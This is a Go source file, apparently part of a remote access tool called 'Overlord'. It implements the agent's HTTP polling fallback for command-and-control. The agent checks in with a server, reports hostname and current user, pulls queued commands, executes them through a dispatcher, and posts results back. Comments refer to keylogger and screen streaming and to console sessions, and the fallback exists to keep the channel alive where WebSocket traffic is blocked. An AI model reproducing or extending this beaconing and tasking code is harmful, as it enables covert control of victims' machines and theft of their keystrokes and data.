package main

// HTTP polling fallback for agents in environments where WebSocket connections
// are blocked. Uses GET /api/poll/:id/tasks and POST /api/poll/:id/results.
// Activated when OVERLORD_HTTP_POLL=true or after enough consecutive WS failures.
//
// Limitations vs. WebSocket mode:
//   - No real-time screen / keylogger streaming
//   - Commands are polled on a fixed interval, not pushed
//   - Console sessions work but output is batched per result flush

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"nhooyr.io/websocket"
	"github.com/vmihailenco/msgpack/v5"

	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/handlers"
	"overlord-client/cmd/agent/internal/overlordenv"
	rt "overlord-client/cmd/agent/runtime"
)

// pollInterval is how often the agent polls for new tasks.
const pollInterval = 5 * time.Second

// pollCommand mirrors the JSON shape returned by GET /api/poll/:id/tasks.
type pollCommand struct {
	ID          string      `json:"id"`
	CommandType string      `json:"commandType"`
	Payload     interface{} `json:"payload,omitempty"`
	ExpiresAt   int64       `json:"expiresAt,omitempty"`
	EnqueuedAt  int64       `json:"enqueuedAt"`
}

// pollResultPost is what the agent POSTs to /api/poll/:id/results.
type pollResultPost struct {
	ID     string      `json:"id"`
	Result interface{} `json:"result,omitempty"`
	Error  string      `json:"error,omitempty"`
}

// httpPollWriter implements wire.Writer by capturing msgpack-encoded results
// and buffering them for a subsequent HTTP POST flush.
type httpPollWriter struct {
	mu      sync.Mutex
	pending []pollResultPost
}

func (w *httpPollWriter) Write(_ context.Context, _ websocket.MessageType, p []byte) error {
	var msg map[string]interface{}
	if err := msgpack.Unmarshal(p, &msg); err != nil {
		return nil
	}
	msgType, _ := msg["type"].(string)
	if msgType != "command_result" {
		return nil
	}
	cmdID, _ := msg["commandId"].(string)
	if cmdID == "" {
		return nil
	}
	ok, _ := msg["ok"].(bool)
	message, _ := msg["message"].(string)
	errCode, _ := msg["errorCode"].(string)

	r := pollResultPost{ID: cmdID}
	if ok {
		r.Result = message
	} else {
		errMsg := message
		if errCode != "" {
			errMsg = errCode + ": " + message
		}
		r.Error = errMsg
	}

	w.mu.Lock()
	w.pending = append(w.pending, r)
	w.mu.Unlock()
	return nil
}

func (w *httpPollWriter) drain() []pollResultPost {
	w.mu.Lock()
	out := w.pending
	w.pending = nil
	w.mu.Unlock()
	return out
}

// wssToPollBase converts a wss:// or ws:// URL to an https:// base URL.
func wssToPollBase(serverURL string) string {
	lower := strings.ToLower(serverURL)
	switch {
	case strings.HasPrefix(lower, "wss://"):
		return "https://" + serverURL[6:]
	case strings.HasPrefix(lower, "ws://"):
		return "http://" + serverURL[5:]
	}
	return serverURL
}

// isHttpPollEnabled returns true when HTTP polling mode is explicitly requested.
func isHttpPollEnabled() bool {
	v := strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_HTTP_POLL")))
	return v == "true" || v == "1" || v == "yes"
}

func runPollClient(cfg config.Config) {
	transport, err := createHTTPTransport(cfg)
	if err != nil {
		log.Printf("[poll] refusing to start with invalid TLS configuration: %v", err)
		return
	}
	httpClient := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	baseURL := wssToPollBase(cfg.ServerURLs[0])
	clientID := cfg.ID
	token := cfg.AgentToken

	writer := &httpPollWriter{}
	env := &rt.Env{
		Conn: writer,
		Cfg:  cfg,
	}
	env.SetServerClientID(clientID)

	dispatcher := handlers.NewDispatcher(env)

	log.Printf("[poll] starting HTTP polling fallback → %s (interval: %s)", baseURL, pollInterval)

	// Announce ourselves: send a lightweight hello so the server registers this agent.
	if err := pollHello(httpClient, baseURL, clientID, token, cfg); err != nil {
		log.Printf("[poll] hello failed: %v (continuing anyway)", err)
	}

	ctx := context.Background()

	const maxBackoff = 5 * time.Minute
	backoff := pollInterval
	consecutiveErrs := 0

	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for range ticker.C {
		commands, err := pollFetchTasks(httpClient, baseURL, clientID, token)
		if err != nil {
			consecutiveErrs++
			log.Printf("[poll] fetch tasks failed (err #%d): %v", consecutiveErrs, err)
			// Exponential backoff: double every 3 consecutive failures, cap at 5 min.
			if consecutiveErrs%3 == 0 {
				backoff *= 2
				if backoff > maxBackoff {
					backoff = maxBackoff
				}
				log.Printf("[poll] backing off to %s", backoff)
				ticker.Reset(backoff)
			}
			continue
		}
		// Successful fetch: reset backoff.
		if consecutiveErrs > 0 {
			consecutiveErrs = 0
			backoff = pollInterval
			ticker.Reset(backoff)
		}

		if len(commands) == 0 {
			continue
		}
		log.Printf("[poll] got %d command(s)", len(commands))

		reconnect := false
		for _, cmd := range commands {
			envelope := map[string]interface{}{
				"type":        "command",
				"id":          cmd.ID,
				"commandType": cmd.CommandType,
				"payload":     cmd.Payload,
			}
			if err := dispatcher.Dispatch(ctx, envelope); err != nil {
				if errors.Is(err, handlers.ErrReconnect) {
					// Server requested a reconnect; exit the poll loop so runClient
					// can restart the session (re-entering poll or WS mode).
					log.Printf("[poll] reconnect requested, restarting session")
					reconnect = true
					break
				}
				log.Printf("[poll] dispatch error for %s/%s: %v", cmd.CommandType, cmd.ID, err)
			}
		}

		// Flush any results the dispatcher wrote back.
		results := writer.drain()
		for _, r := range results {
			if err := pollPostResult(httpClient, baseURL, clientID, token, r); err != nil {
				log.Printf("[poll] post result failed for %s: %v", r.ID, err)
			}
		}

		if reconnect {
			return
		}
	}
}

// pollHello sends a lightweight announce payload so the server knows the agent
// is alive in poll mode. It reuses the same /api/poll/:id/results path with a
// synthetic result bearing type "poll_hello".
func pollHello(client *http.Client, baseURL, clientID, token string, cfg config.Config) error {
	payload := map[string]interface{}{
		"id": "poll_hello",
		"result": map[string]interface{}{
			"type":    "poll_hello",
			"version": cfg.Version,
			"os":      cfg.OS,
			"arch":    cfg.Arch,
			"host":    rt.Hostname(),
			"user":    rt.CurrentUser(),
		},
	}
	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, payload)
}

func pollFetchTasks(client *http.Client, baseURL, clientID, token string) ([]pollCommand, error) {
	req, err := http.NewRequest("GET", baseURL+"/api/poll/"+clientID+"/tasks", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Agent-Token", token)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, nil
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, err
	}

	var commands []pollCommand
	if err := json.Unmarshal(body, &commands); err != nil {
		return nil, err
	}
	return commands, nil
}

func pollPostResult(client *http.Client, baseURL, clientID, token string, r pollResultPost) error {
	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, r)
}

func pollPost(client *http.Client, url, token string, payload interface{}) error {
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-Token", token)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// createHTTPTransport is defined in session.go — reused here (same package).
